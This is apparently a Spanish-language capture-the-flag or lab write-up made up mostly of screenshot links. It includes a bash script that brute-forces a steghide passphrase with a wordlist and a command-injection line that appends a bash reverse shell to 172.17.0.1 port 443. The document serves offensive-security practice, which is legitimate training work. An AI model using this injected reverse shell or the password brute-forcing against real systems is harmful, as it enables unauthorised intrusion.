![](Pasted%20image%2020250309180419.png)

![](Pasted%20image%2020250309180525.png)

![](Pasted%20image%2020250309180709.png)

![](Pasted%20image%2020250309180827.png)

![](Pasted%20image%2020250309180910.png)

![](Pasted%20image%2020250309183320.png)

![](Pasted%20image%2020250310133216.png)

Con esto el comando nos muestra su respuesta stderr, buscaremos un stdout con fuerza bruta:

``` bash
#!/bin/bash

# Verifica que se hayan pasado los argumentos correctamente
if [ "$#" -ne 2 ]; then
    echo "Uso: $0 <archivo_imagen> <archivo_wordlist>"
    exit 1
fi

image_file=$1
wordlist_file=$2

# Contar las contraseñas en el archivo wordlist
total_lines=$(wc -l < "$wordlist_file")
echo "[+] Total de contraseñas en la lista: $total_lines"

# Leer el archivo wordlist y probar cada contraseña
i=0
while IFS= read -r password; do
    i=$((i + 1))
    # Ejecutar steghide para intentar extraer con la contraseña
    result=$(steghide --extract -sf "$image_file" -p "$password" 2>&1)
    
    # Si el comando es exitoso, se imprimirá la salida y terminamos
    if [[ $? -eq 0 ]]; then
        echo "[+] ¡Contraseña correcta! : $password"
        echo "$result"  # Mostrar la salida de steghide (contenido extraído)
        break
    fi

    # Mostrar progreso cada 100 intentos
    if (( i % 100 == 0 )); then
        echo "[+] Intento $i/$total_lines contraseñas."
    fi
done < "$wordlist_file"

echo "[+] Proceso terminado."
```

![](Pasted%20image%2020250310142121.png)

![](Pasted%20image%2020250310152709.png)

![](Pasted%20image%2020250310152735.png)

![](Pasted%20image%2020250310153810.png)
![](Pasted%20image%2020250310155200.png)

![](Pasted%20image%2020250310155957.png)

``` bash
echo -e 'pinguino hackeable' > archivo.txt; bash -i >& /dev/tcp/172.17.0.1/443 0>&1
```

![](Pasted%20image%2020250310161517.png)

![](Pasted%20image%2020250310161547.png)

